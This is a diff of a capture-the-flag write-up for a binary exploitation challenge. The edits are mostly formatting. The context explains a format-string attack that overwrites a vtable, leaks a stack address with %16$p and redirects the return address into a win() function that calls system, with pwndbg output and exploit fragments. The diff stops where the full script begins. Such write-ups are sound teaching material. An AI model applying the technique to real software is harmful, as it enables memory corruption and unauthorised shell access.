@@ -56,7 +56,7 @@ To do our goal before it will write many input and its too complicated. So chang
 
 
 Alright, first we need more than one formatstring, to do that we need overwrite vtable to **Play()** again.
-Now how to overwrite the vtable? We only have one time formatstring. And the formatstring is in **BSS** not in stack, so we cant use technique like usual.\
+Now how to overwrite the vtable? We only have one time formatstring. And the formatstring is in **BSS** not in stack, so we cant use technique like usual.
 
 ![pokemon](images/pokemon4.png)
 
@@ -72,7 +72,7 @@ p.sendline(payload)
 
 ![pokemon](images/pokemon6.png)
 
-Now we have unlimited formatstring. If you look at the stack rightnow the stack step back 0x20.\
+Now we have unlimited formatstring. If you look at the stack rightnow the stack step back 0x20.
 
 ![pokemon](images/pokemon6.png)
 
@@ -111,7 +111,7 @@ p.sendline("%16$p")
 #0x7fffffffdd78
 ```
 
-Alright with this we can simply do the sametrick when we do `%16$n` it will overwrite the return address which is the **main()** function. After that just overwrite vtable back to **Battle()** and we got shell!. Because there's stack alignment error when call **win()** function. Instead of overwrite to start address of **win()** we overwrite to here
+Alright with this we can simply do the sametrick when we do `%16$n` it will overwrite the return address which is the **main()** function. After that just overwrite vtable back to **Battle()** and we got shell!. Because there's stack alignment error when call **win()** function. Instead of overwrite to start address of **win()** we overwrite to here:
 ```bash
 pwndbg> p &win
 $1 = (<text variable, no debug info> *) 0x5555555552be <win()>
@@ -124,6 +124,8 @@ Dump of assembler code for function _Z3winv:
    0x00005555555552cd <+15>:	call   0x5555555550c0 <system@plt>
 ```
 Overwrite to **0xc6**.\
+With this now we solve the challenge.\
+
 Full script:
 
 ```py
